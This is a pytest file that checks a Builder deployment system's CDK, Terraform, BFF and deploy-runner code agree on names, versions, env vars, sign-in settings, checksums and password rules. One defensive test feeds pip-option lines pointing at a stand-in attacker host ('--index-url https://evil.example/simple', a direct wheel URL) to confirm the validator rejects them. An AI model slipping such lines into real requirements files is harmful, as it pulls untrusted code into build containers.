"""The Builder's control plane is declared twice — cdk/lib/builder-plane.ts and
terraform/builder.tf — and driven from two more places: the BFF (bff/builds.py) and the
deploy runner (deployer/runner.py). These hold the four to the same facts, because a
constant that differs between them fails only on one kind of deployment, and only at
deploy time, inside CodeBuild.
"""

from __future__ import annotations

import json
import re
import sys
from pathlib import Path

ORCH = Path(__file__).resolve().parent.parent
TS = (ORCH / "cdk" / "lib" / "builder-plane.ts").read_text()
TF = (ORCH / "terraform" / "builder.tf").read_text()
BIN = (ORCH / "cdk" / "bin" / "orchestrator.ts").read_text()
VARIABLES = "\n".join(p.read_text() for p in (ORCH / "terraform").glob("*.tf"))

sys.path.insert(0, str(ORCH / "bff"))
sys.path.insert(0, str(ORCH / "deployer"))
import buildstore  # noqa: E402
import runner  # noqa: E402


def test_the_build_name_prefix_is_the_same_everywhere():
    assert f'BUILD_AGENT_PREFIX = "{buildstore.AGENT_PREFIX}"' in TS
    assert re.search(rf'build_agent_prefix\s*=\s*"{buildstore.AGENT_PREFIX}"', TF)
    assert buildstore.AGENT_RE.match(buildstore.new_agent_name())


def test_a_build_name_fits_every_aws_limit_it_feeds():
    """The tightest: the UI bucket agentcore-<name>-ui-<12-digit account>-<region>, 63
    characters, in the longest-named commercial region."""
    name = buildstore.new_agent_name().replace("_", "-")
    assert len(f"agentcore-{name}-ui-123456789012-ap-southeast-2") <= 63
    assert len(f"{buildstore.new_agent_name()}_semantic") <= 48       # AgentCore Memory
    assert len(f"AgentCoreSubagent-{buildstore.new_agent_name()}-") <= 64 - 20  # leaves 20 for an id


def test_the_terraform_version_is_pinned_once():
    version = re.search(r'TERRAFORM_VERSION = "([0-9.]+)"', TS).group(1)
    assert re.search(rf'terraform_version\s*=\s*"{re.escape(version)}"', TF)
    assert f'"TERRAFORM_VERSION") or "{version}"' in (ORCH / "deployer" / "runner.py").read_text()


def test_both_paths_leave_the_same_things_out_of_the_source():
    ts = set(json.loads("[" + re.search(r"SOURCE_EXCLUDES = \[(.*?)\];", TS, re.DOTALL).group(1)
                        .replace("'", '"').rstrip().rstrip(",") + "]"))
    tf = {re.sub(r"^\*\*/|/\*\*$", "", p) for p in
          re.findall(r'"([^"]+)"', re.search(r"excludes = \[(.*?)\]", TF, re.DOTALL).group(1))}
    assert ts == tf
    # The ones that matter most: a developer's own settings, which may carry secrets.
    assert {"terraform.tfvars", "backend.hcl", ".env", "*.tfstate"} <= ts


def test_the_deploy_policy_splits_into_policies_that_can_be_attached():
    doc = json.loads((ORCH / "terraform" / "deploy-role-policy.json").read_text())
    size = int(re.search(r"DEPLOY_POLICY_CHUNK = (\d+)", TS).group(1))
    assert f", {size})" in TF or f"i + {size}" in TF
    stmts = doc["Statement"]
    for i in range(0, len(stmts), size):
        body = json.dumps({"Version": "2012-10-17", "Statement": stmts[i:i + size]},
                          separators=(",", ":"))
        assert len(body) < 6144, f"chunk {i // size} is {len(body)} characters"


def test_the_buildspec_runs_the_runner():
    spec = json.loads((ORCH / "deployer" / "buildspec.json").read_text())
    assert "python3 deployer/runner.py" in "\n".join(spec["phases"]["build"]["commands"])
    assert "buildspec.json" in TS and "buildspec.json" in TF
    # A supported Node: the image's default (18) is past end of support, and CDK warns
    # on every deploy.
    assert spec["phases"]["install"]["runtime-versions"]["nodejs"] >= 20


def test_the_project_environment_is_what_the_runner_reads():
    for name in ("SOURCE_URI", "BUILDS_TABLE", "BUILDS_BUCKET", "TERRAFORM_VERSION"):
        assert f"{name}:" in TS and f'name  = "{name}"' in TF
    # What the BFF sends per build, in the overrides the runner requires.
    sent = set(re.findall(r'"([A-Z_]+)": ', (ORCH / "bff" / "builds.py").read_text()
                          .split("env = {", 1)[1].split("}", 1)[0]))
    assert set(runner.REQUIRED) - {"BUILDS_TABLE", "BUILDS_BUCKET"} <= sent


def test_the_runner_deploys_with_flags_both_tools_understand():
    """A context key or variable the IaC does not declare is silently ignored — and
    `builder=false` being ignored would give every build a console of its own."""
    for signin in SIGN_INS:
        flags = runner.cdk_context("ax_12345678", True, None, signin)
        for key in [f.split("=")[0] for f in flags if f != "-c"]:
            assert f'"{key}"' in BIN, f"cdk/bin/orchestrator.ts reads no context key {key!r}"
        tf = runner.tf_vars("ax_12345678", True, "us-east-1", None, signin)
        for var in tf:
            assert f'variable "{var}"' in VARIABLES, f"terraform declares no variable {var!r}"
        provider = signin["provider"]
        if provider != "cognito":
            # Each field lands in that provider's variable object, under a name it declares.
            block = VARIABLES.split(f'variable "{provider}"', 1)[1].split("\n}\n", 1)[0]
            for field in tf[provider]:
                assert re.search(rf"\b{field}\s*=", block), f"variable {provider} declares no {field!r}"


SIGN_INS = [
    {"provider": "cognito"},
    {"provider": "okta", "domain": "acme.okta.com", "clientId": "0oaSpa", "authorizationServer": "default"},
    {"provider": "auth0", "domain": "acme.us.auth0.com", "clientId": "abc"},
    {"provider": "entra", "tenantId": "72f988bf-86f1-41af-91ab-2d7cd011db47", "clientId": "spa"},
]


def test_a_build_signs_in_with_what_its_workflow_names():
    assert runner.sign_in({}) == {"provider": "cognito"}
    okta = runner.sign_in({"authorization": {"signIn": SIGN_INS[1]}})
    flags = runner.cdk_context("ax_1", True, None, okta)
    assert "idp=okta" in flags and "oktaDomain=acme.okta.com" in flags and "oktaClientId=0oaSpa" in flags
    assert "createCognito=true" not in flags        # the sign-in pool is not made
    tf = runner.tf_vars("ax_1", True, "us-east-1", None, okta)
    assert tf["idp"] == "okta" and "cognito" not in tf
    assert tf["okta"] == {"domain": "acme.okta.com", "client_id": "0oaSpa", "authorization_server": "default"}
    entra = runner.tf_vars("ax_1", True, "us-east-1", None, runner.sign_in({"authorization": {"signIn": SIGN_INS[3]}}))
    assert entra["entra"] == {"tenant_id": SIGN_INS[3]["tenantId"], "client_id": "spa"}
    # Nothing said: Cognito, as before.
    assert "createCognito=true" in runner.cdk_context("ax_1", True)
    assert runner.tf_vars("ax_1", True, "us-east-1")["cognito"] == {"create": True}


def test_the_console_env_var_names_agree():
    for name in ("BUILDS_TABLE", "BUILDS_BUCKET", "DEPLOY_PROJECT"):
        assert f'"{name}"' in TS and f"{name} " in TF
        assert f'"{name}"' in (ORCH / "bff" / "builds.py").read_text()


def test_the_kb_gateway_target_name_is_never_empty():
    """The provider validates a resource block's literal values even at count = 0, so a
    name read straight from `local.kb_tool_name` — "" for a workflow with no knowledge-base
    tool — failed `terraform apply` for every such workflow. Found deploying a tool-less
    Builder build with Terraform."""
    kb = (ORCH / "terraform" / "kb.tf").read_text()
    block = kb.split('resource "aws_bedrockagentcore_gateway_target" "kb"', 1)[1].split("\n}\n", 1)[0]
    name = next(line for line in block.splitlines() if re.match(r"\s*name\s*=", line))
    assert "local.kb_enabled ?" in name, name


def test_a_terraform_deploy_builds_the_ui_before_the_full_apply(monkeypatch, tmp_path):
    """ui.tf's for_each is the UI build's file list, unknown at plan time on a stack's
    first apply, so the runner builds the UI with a targeted apply first."""
    calls = []
    monkeypatch.setattr(runner, "ROOT", tmp_path)
    (tmp_path / "terraform").mkdir()
    monkeypatch.setattr(runner, "ensure_terraform", lambda v: "terraform")
    monkeypatch.setattr(runner, "run", lambda cmd, cwd, env=None, keep=60: calls.append(cmd))
    monkeypatch.setattr(runner.subprocess, "run",
                        lambda *a, **k: type("R", (), {"stdout": "{}"})())
    runner.deploy_terraform("deploy", "ax_12345678", False,
                            {"BUILDS_BUCKET": "b", "STATE_PREFIX": "tfstate/u1/p1/"})
    override = (tmp_path / "terraform" / "zz_builder_backend_override.tf").read_text()
    assert 'key    = "tfstate/u1/p1/terraform.tfstate"' in override
    applies = [c for c in calls if c[1] == "apply"]
    assert applies[0][-1] == "-target=null_resource.ui_build"
    assert not any(a.startswith("-target") for a in applies[1])
    # A destroy too: a failed destroy can leave the build step out of state.
    calls.clear()
    runner.deploy_terraform("destroy", "ax_12345678", False,
                            {"BUILDS_BUCKET": "b", "STATE_PREFIX": "tfstate/u1/p1/"})
    assert [c[1] for c in calls if c[1] in ("apply", "destroy")] == ["apply", "destroy"]
    assert calls[1][-1] == "-target=null_resource.ui_build"


def test_the_a2a_url_survives_a_workflow_without_the_stand_in():
    """one() of an empty list is null, not an error — try() must wrap the trimsuffix."""
    a2a = (ORCH / "terraform" / "a2a.tf").read_text()
    line = next(x for x in a2a.splitlines() if x.strip().startswith("a2a_function_url"))
    assert line.split("=", 1)[1].strip().startswith("try(trimsuffix(one("), line


def test_both_paths_tag_every_resource_with_the_app_and_any_tags_given():
    assert '"agentexpress:app": agentName' in BIN and 'ctx("tags", "")' in BIN
    versions = (ORCH / "terraform" / "versions.tf").read_text()
    assert 'merge({ "agentexpress:app" = var.agent_name }, var.tags)' in versions
    assert 'variable "tags"' in VARIABLES


def test_the_connect_role_prefix_is_the_same_everywhere():
    assert f'CONNECT_ROLE_PREFIX = "{buildstore.CONNECT_ROLE_PREFIX}"' in TS
    assert re.search(rf'connect_role_prefix\s*=\s*"{buildstore.CONNECT_ROLE_PREFIX}"', TF)


def test_a_tool_api_key_never_makes_a_for_each_sensitive():
    """var.tool_api_keys is sensitive, so anything filtered on it is too, and Terraform
    refuses a sensitive for_each: every Terraform deploy WITH a key failed. The set of
    names is made nonsensitive; the keys themselves are not."""
    tools = (ORCH / "terraform" / "tools.tf").read_text()
    assert "keyed_tool_names = toset(nonsensitive([" in tools
    assert "for_each = local.keyed_tool_names" in tools
    assert "each.value.api_key" not in tools


def test_a_code_tools_requirements_cannot_carry_pip_options():
    """Checked again where pip runs: `--index-url https://attacker/simple` in a
    requirements.txt would make the deploy container fetch packages from anywhere."""
    import pytest
    runner.check_requirements("requests==2.32.3\n# a comment\n\n", "t")
    for bad in ("--index-url https://evil.example/simple", "-e git+https://x/y", "./local",
                "pkg @ https://evil.example/pkg.whl", "-r other.txt"):
        with pytest.raises(runner.StepFailed, match="only `name==version`"):
            runner.check_requirements(f"requests==2.32.3\n{bad}\n", "t")
    assert "--isolated" in runner.CODE_PIP


def test_the_terraform_download_is_checked_against_a_checksum_held_in_the_repo(monkeypatch):
    import hashlib
    import io
    import zipfile

    import pytest
    monkeypatch.setattr(runner.shutil, "which", lambda _: None)
    monkeypatch.setattr(runner.platform, "machine", lambda: "aarch64")
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("terraform", "#!/bin/sh\n")
    blob = buf.getvalue()
    fetched = []

    class Resp(io.BytesIO):
        def __enter__(self):
            return self

        def __exit__(self, *a):
            return False

    def fake_open(url, timeout=0):
        fetched.append(url)
        return Resp(blob)
    monkeypatch.setattr(runner.urllib.request, "urlopen", fake_open)
    # The real pinned checksum does not match this fake zip: refused.
    with pytest.raises(runner.StepFailed, match="SHA256"):
        runner.ensure_terraform("1.15.8")
    assert not any("SHA256SUMS" in u for u in fetched), "the checksum came from the download host"
    # A version with no pinned checksum is refused unless one is given.
    with pytest.raises(runner.StepFailed, match="no pinned checksum"):
        runner.ensure_terraform("9.9.9")
    monkeypatch.setenv("TERRAFORM_SHA256", hashlib.sha256(blob).hexdigest())
    assert runner.ensure_terraform("9.9.9").endswith("terraform")


def test_the_owners_first_password_meets_the_pool_policy():
    # Both IaC paths: 12+ characters, upper, lower, digit and symbol.
    for _ in range(50):
        pw = runner.temporary_password()
        assert len(pw) >= 12 and any(c.isupper() for c in pw) and any(c.islower() for c in pw)
        assert any(c.isdigit() for c in pw) and any(not c.isalnum() for c in pw)
